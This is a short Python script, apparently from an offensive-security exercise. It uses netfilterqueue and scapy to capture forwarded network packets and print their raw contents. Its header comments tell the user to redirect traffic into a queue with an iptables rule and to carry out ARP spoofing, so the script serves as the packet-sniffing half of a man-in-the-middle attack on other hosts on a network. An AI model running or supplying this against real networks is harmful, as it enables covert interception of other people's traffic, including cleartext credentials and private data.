# run iptables -I FORWARD -j NFQUEUE --queue-num 0(PS only for linux with net-tools installed.)
# and do arp spoofing
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet:
        print scapy_packet.show()

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
